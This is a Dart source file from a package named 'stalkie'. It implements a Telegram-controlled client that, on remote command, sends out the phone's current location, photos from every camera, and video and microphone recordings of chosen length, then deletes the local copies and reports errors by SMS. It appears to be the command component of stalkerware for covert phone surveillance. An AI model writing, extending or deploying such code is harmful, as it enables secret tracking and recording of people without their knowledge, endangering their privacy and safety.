import 'dart:async';

import 'package:stalkie/safe_long_polling.dart';

import 'package:stalkie/sms_client.dart';
import 'package:teledart/model.dart';
import 'package:teledart/teledart.dart';
import 'package:teledart/telegram.dart';

import 'executor.dart';

class TgClient {
  late TeleDart _client;

  static const _pingCommand = "ping";
  static const _getLocationCommand = "get_location";
  static const _getPhotosCommand = "get_photos";
  static const _getVideosCommand = "get_video";
  static const _getAudioCommand = "get_audio";

  String token;
  int? chatId;

  TgClient(this.token, {this.chatId});

  Future start() async {
    final username = (await Telegram(token).getMe()).username;
    _client = TeleDart(token, Event(username!),
        fetcher: SafeLongPolling(Telegram(token)));

    await _client.setMyCommands([
      BotCommand(command: _pingCommand, description: "ping the app"),
      BotCommand(
          command: _getLocationCommand, description: "get current location"),
      BotCommand(
          command: _getPhotosCommand,
          description: "get photos from all the available cameras"),
      BotCommand(
          command: _getVideosCommand,
          description:
              "get videos from all the available cameras, you can provide seconds as arguments and which camera use, Default: 10 seconds and camera 0"),
      BotCommand(
          command: _getAudioCommand,
          description:
              "record audio from microphone, you can provide seconds as arguments. Default: 10 seconds")
    ]);

    _client.onCommand(_pingCommand).listen((message) async {
      try {
        message.reply("pong");
      } catch (e) {
        SmsClient.sendSMS("$_pingCommand error:\n$e)");
      }
    });

    _client.onCommand(_getLocationCommand).listen((message) async {
      try {
        var loc = await Executor.getLocation();
        message.replyLocation(loc.latitude, loc.longitude);
      } catch (e) {
        SmsClient.sendSMS("$_getLocationCommand error:\n$e");
      }
    });
    _client.onCommand(_getPhotosCommand).listen((message) async {
      try {
        var photos = await Executor.getPhotos();
        for (var i in photos) {
          await message.replyPhoto(i);
          await i.delete();
        }
      } catch (e) {
        SmsClient.sendSMS("$_getPhotosCommand error:\n$e");
      }
    });
    _client.onCommand(_getVideosCommand).listen((message) async {
      try {
        int index = 0;
        int dur = 10;
        var split = message.text!.split(" ");
        if (split.length == 3) {
          index = int.parse(split[1]);
          dur = int.parse(split[2]);
        }
        var video = await Executor.getVideo(index, dur);
        await message.replyVideo(video);
        await video.delete();
      } catch (e) {
        SmsClient.sendSMS("$_getVideosCommand error:\n$e");
      }
    });
    _client.onCommand(_getAudioCommand).listen((message) async {
      try {
        int dur = 10;
        var split = message.text!.split(" ");
        if (split.length == 2) {
          dur = int.parse(split[1]);
        }
        var audio = await Executor.getAudio(dur);
        await message.replyAudio(audio);
        await audio.delete();
      } catch (e) {
        SmsClient.sendSMS("$_getAudioCommand error:\n$e");
      }
    });

    _client.start();
  }

  void stop() {
    _client.stop();
  }
}
